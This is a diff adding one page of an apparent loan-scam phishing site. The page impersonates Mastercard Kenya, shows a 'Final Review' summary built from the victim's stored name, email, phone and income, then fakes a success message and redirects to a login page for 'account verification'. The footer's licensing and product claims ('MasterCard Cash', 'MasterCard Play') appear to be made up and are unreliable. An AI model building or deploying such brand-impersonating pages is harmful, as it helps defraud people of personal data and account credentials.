@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Mastercard | Loan</title>
+    <meta name="theme-color" content="#E30613">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        html,body{height:100%;font-family:'Inter',sans-serif;background:#f8f9fc}
+        body{display:flex;flex-direction:column;align-items:center;padding:clamp(16px,3vw,24px)}
+        header{width:100%;max-width:480px;padding:clamp(16px,4vw,24px);text-align:center;margin-bottom:clamp(16px,4vw,28px);background:white;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.06);position:relative}
+        .back-btn{font-size:clamp(28px,7vw,32px);background:none;border:none;cursor:pointer;color:#2c3e50;position:absolute;left:20px;top:50%;transform:translateY(-50%)}
+        .logo{font-size:clamp(32px,8vw,40px);font-weight:800;letter-spacing:-1px}
+        .logo-m{color:#030303}.logo-c{color:#f80c0c}
+        .card{background:white;border-radius:20px;padding:clamp(28px,6vw,40px) clamp(24px,5vw,32px);width:100%;max-width:480px;box-shadow:0 12px 48px rgba(0,0,0,.08);display:flex;flex-direction:column;justify-content:space-between;flex:1;margin-bottom:16px;overflow:hidden}
+        .top{text-align:center;flex:1;overflow-y:auto;padding-bottom:24px}
+        .form-title{font-size:clamp(24px,6vw,32px);font-weight:700;color:#1a1a1a;margin-bottom:20px}
+        .progress-bar{width:160px;height:6px;background:#e9ecef;border-radius:3px;margin:20px auto;overflow:hidden}
+        .progress-fill{width:100%;height:100%;background:linear-gradient(90deg,#E30613,#b71c1c)}
+        .step-text{color:#6c757d;font-size:15px;font-weight:500;margin-bottom:24px}
+        .form-label{font-weight:600;color:#2c3e50;margin-bottom:8px;font-size:15px;display:block;text-align:left}
+        .form-select,.form-input{width:100%;padding:14px 16px;border:1px solid #ced4da;border-radius:10px;font-size:16px;margin-bottom:6px;transition:border-color .25s,box-shadow .25s;background:#fdfdfe}
+        .form-select:focus,.form-input:focus{border-color:#E30613;outline:none;box-shadow:0 0 0 3px rgba(227,6,19,.15)}
+        .invalid{border-color:#dc3545!important}
+        .error-message{color:#dc3545;font-size:13.5px;font-weight:500;margin:4px 0 20px 0;min-height:18px;display:none;line-height:1.4;text-align:left}
+        .error-visible{display:block}
+        .global-feedback{color:#6c757d;font-size:14.5px;text-align:center;margin:16px 0 24px;padding:12px;background:#fff5f5;border:1px solid #ffebee;border-radius:8px;display:none}
+        .summary-box{background:#fff5f5;padding:20px;border-radius:16px;font-size:14.5px;margin:24px 0 32px;border:1px solid #ffebee}
+        .summary-row{display:flex;justify-content:space-between;margin-bottom:12px;color:#495057}
+        .summary-row:last-child{margin-bottom:0}
+        .summary-value{font-weight:600;color:#1a1a1a}
+        .btn-group{display:flex;gap:16px}
+        .prev-btn,.submit-btn{flex:1;padding:16px;border:none;border-radius:50px;font-size:17px;font-weight:700;cursor:pointer;transition:all .2s}
+        .prev-btn{background:#e9ecef;color:#495057}
+        .prev-btn:hover{opacity:.92}
+        .submit-btn{background:linear-gradient(90deg,#E30613,#b71c1c);color:white;box-shadow:0 8px 24px rgba(227,6,19,.25)}
+        .submit-btn:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(227,6,19,.35)}
+        footer{padding:clamp(20px,5vw,32px) 20px;color:#adb5bd;font-size:clamp(12px,3vw,14px);text-align:center}
+        #spinnerOverlay{position:fixed;inset:0;background:rgba(227,6,19,.15);display:none;justify-content:center;align-items:center;z-index:1000;flex-direction:column}
+        .spinner{width:60px;height:60px;border:6px solid #f0f0f0;border-top:6px solid #E30613;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:30px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        #successOverlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;justify-content:center;align-items:center;z-index:1000}
+        .success-card{background:white;border-radius:24px;padding:40px 30px;width:90%;max-width:420px;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,.2)}
+        .check-icon{width:80px;height:80px;background:#00c853;border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 30px;font-size:48px;color:white}
+        .success-title{font-size:24px;font-weight:700;color:#00c853;margin-bottom:15px}
+        .success-msg{font-size:16px;color:#666;line-height:1.6;margin-bottom:30px}
+        .redirect-bar{background:#f0f0f0;padding:14px;border-radius:50px;font-size:15px;color:#666;margin-bottom:20px;display:flex;align-items:center;justify-content:center;gap:10px}
+        .redirect-bar .loader{width:20px;height:20px;border:2px solid #f3f3f3;border-top:2px solid #E30613;border-radius:50%;animation:spin 1s linear infinite}
+        .go-btn{width:100%;padding:16px;background:#E30613;color:white;border:none;border-radius:50px;font-size:17px;font-weight:700;cursor:pointer}
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-m">Master</span><span class="logo-c">Card</span></div>
+    </header>
+    <main class="card">
+        <div class="top">
+            <h1 class="form-title">Final Review</h1>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+            <div class="step-text">Step 3 of 3 – Confirm &amp; Submit</div>
+            <label class="form-label">Employment Status</label>
+            <select class="form-select" id="employmentStatus">
+                <option>Employed</option><option>Self-Employed</option><option>Unemployed</option><option>Student</option>
+            </select>
+            <label class="form-label">Estimated Annual Income (USD)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 12,000">
+            <div class="error-message" id="errIncome">Kindly enter a valid annual income (minimum USD500 recommended).</div>
+            <div class="summary-box" id="summaryBox"></div>
+            <div class="global-feedback" id="globalFeedback">Please review the information above and complete the required field to submit.</div>
+        </div>
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">Previous Step</button>
+            <button class="submit-btn" id="submitBtn">Submit Application</button>
+        </div>
+    </main>
+    <footer>© 2026 MasterCard Kenya – Licensed Mobile Financial Services | Powered by MasterCard Cash &amp; MasterCard Play</footer>
+
+    <div id="spinnerOverlay"><div class="spinner"></div></div>
+    <div id="successOverlay">
+        <div class="success-card">
+            <div class="check-icon">✓</div>
+            <div class="success-title">Account Verification</div>
+            <div class="success-msg">Your loan application has been successfully submitted.<br><br>You will be taken through account verification shortly.</div>
+            <div class="redirect-bar"><div class="loader"></div>Redirecting in <span id="countdown">3</span>...</div>
+            <button class="go-btn" onclick="window.location.href='login.html'">Go to MasterCard Play Now</button>
+        </div>
+    </div>
+
+    <script>
+        const summaryBox=document.getElementById('summaryBox');
+        const loanAmount=localStorage.getItem('loanAmount')||'500';
+        const formattedAmount=parseFloat(loanAmount).toLocaleString('en-US');
+        const termDays=localStorage.getItem('loanTerm')||'30';
+        summaryBox.innerHTML=`
+            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType')||'Ready Loan'}</span></div>
+            <div class="summary-row"><span>Requested Amount:</span><span class="summary-value">USD ${formattedAmount}</span></div>
+            <div class="summary-row"><span>Loan Term:</span><span class="summary-value">${termDays} days</span></div>
+            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose')||'Not specified'}</span></div>
+            <div class="summary-row"><span>Applicant:</span><span class="summary-value">${localStorage.getItem('firstName')||''} ${localStorage.getItem('lastName')||''}</span></div>
+            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email')||'N/A'}</span></div>
+            <div class="summary-row"><span>Mobile Number:</span><span class="summary-value">+254 ${localStorage.getItem('phone')||'N/A'}</span></div>`;
+        if(localStorage.getItem('employmentStatus')) document.getElementById('employmentStatus').value=localStorage.getItem('employmentStatus');
+        if(localStorage.getItem('annualIncome')) document.getElementById('annualIncome').value=localStorage.getItem('annualIncome');
+        document.getElementById('submitBtn').addEventListener('click',function(){
+            const income=document.getElementById('annualIncome').value.trim();
+            document.getElementById('annualIncome').classList.remove('invalid');
+            document.getElementById('errIncome').classList.remove('error-visible');
+            document.getElementById('globalFeedback').style.display='none';
+            if(!income||Number(income)<12000){
+                document.getElementById('annualIncome').classList.add('invalid');
+                document.getElementById('errIncome').classList.add('error-visible');
+                document.getElementById('globalFeedback').style.display='block';
+                return;
+            }
+            localStorage.setItem('employmentStatus',document.getElementById('employmentStatus').value);
+            localStorage.setItem('annualIncome',income);
+            document.getElementById('spinnerOverlay').style.display='flex';
+            setTimeout(()=>{
+                document.getElementById('spinnerOverlay').style.display='none';
+                document.getElementById('successOverlay').style.display='flex';
+                let s=3;const el=document.getElementById('countdown');
+                const t=setInterval(()=>{s--;el.textContent=s;if(s<=0){clearInterval(t);window.location.href='login.html';}},1000);
+            },3000);
+        });
+    </script>
+</body>
+</html>
